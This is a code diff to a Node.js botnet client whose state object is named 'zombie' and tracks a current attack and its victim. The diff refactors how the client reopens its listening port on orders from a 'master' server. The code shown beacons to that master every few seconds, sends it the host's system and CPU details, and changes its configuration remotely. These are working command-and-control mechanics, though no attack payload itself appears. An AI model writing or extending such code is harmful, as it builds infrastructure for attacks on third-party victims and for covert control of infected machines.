@@ -17,7 +17,16 @@ var settingIntegrity = new EventEmitter()
 const db = require('quick.db');
 let htserver = null
 let zombie = {
-    port: null,
+    port: {
+        number: null,
+        change: function (val) {
+            if (val !== zombie.port.number) {
+                replenishPort()
+            }
+            zombie.port.number = val
+            return zombie.port.number
+        }
+    },
     currentAttack: {
         victim: null,
         doneby: null,
@@ -47,6 +56,11 @@ let zombie = {
             net: null
         }
     }
+}
+
+function replenishPort() {
+    htserver.close()
+    htserver = app.listen(zombie.port.number, () => console.log(`App listening on port! ${zombie.port.number}`)) 
 }
 
 function checkLocalMaster() {
@@ -81,7 +95,7 @@ function checkLocalMaster() {
 
 checkLocalMaster()
 
-function    checkMaster(master_) {
+function checkMaster(master_) {
     axios.get("http://" + master_)
         .then(res => {
             let code = res.statusCode
@@ -112,7 +126,7 @@ function    checkMaster(master_) {
 function fetchSettings() {
     axios.get("http://" + master + "/globals")
         .then(res => {
-            zombie.port = res.data.port.number
+            zombie.port.number = res.data.port.number
             console.log(res.data);
             settingIntegrity.emit('true');
         })
@@ -243,7 +257,7 @@ settingIntegrity.on('true', () => {
     app.get('/currentAttack/', (req, res) => {
         res.send(200, zombie.currentAttack)
     })
-    htserver = app.listen(zombie.port, () => console.log(`App listening on port! ${zombie.port}`))
+    htserver = app.listen(zombie.port.number, () => console.log(`App listening on port! ${zombie.port.number}`))
 
     si.getStaticData(function (data) {
         zombie.systemInfo.static = data
@@ -252,53 +266,47 @@ settingIntegrity.on('true', () => {
     async function complexHeartbeat() {
         if (!zombie.busy) {
             axios.post("http://" + master + "/heartbeat", { machine: zombie })
-            .then(res => {
-                console.log(res.data);
-                zombie.port = res.data.port.number
-            })
-            .catch(err => {
-                console.log(err);
-            })
+                .then(res => {
+                    console.log(res.data);
+                    zombie.port.change(res.data.port.number)
+                })
+                .catch(err => {
+                    console.log(err);
+                })
         }
     }
     async function simpleHeartbeat() {
         let zombiealt = {}
-        zombiealt.port = zombie.port
+        zombiealt.port = zombie.port.number
         zombiealt.busy = zombie.busy
         zombiealt.init = zombie.init
         zombiealt.currentAttack = zombie.currentAttack
-        axios.patch("http://" + master + "/heartbeat", {machine: zombiealt})
-        .then(res => {
-            console.log(res.data);
-            zombie.port = res.data.port.number
-                if (res.data.port.changeAt < Date.now() || res.data.port.last === zombie.port) {
-                    zombie.port = res.data.port.number
-                    htserver.close()
-                    htserver = app.listen(zombie.port, () => console.log(`App listening on port! ${zombie.port}`))
-                    console.log(res.data);
-                }
+        axios.patch("http://" + master + "/heartbeat", { machine: zombiealt })
+            .then(res => {
+                console.log(res.data);
+                zombie.port.change(res.data.port.number)
             })
             .catch(err => {
                 console.log(err);
             })
     }
-    
+
     simpleHeartbeat();
     complexHeartbeat();
-    
+
     setInterval(function () {
         simpleHeartbeat()
     }, 5000)
-    
-    
+
+
     setInterval(function () {
         complexHeartbeat()
     }, 60000)
-    
+
     setInterval(() => {
         siDataPlacement()
     }, 10000);
-    
+
     si.getDynamicData(function (data) {
         zombie.systemInfo.dynamic.all = data
     })
@@ -309,7 +317,7 @@ settingIntegrity.on('true', () => {
             })
         }
     }, 30000);
-    
+
     async function siDataPlacement() {
         if (!zombie.busy) {
             si.cpu(function (cpudata) {
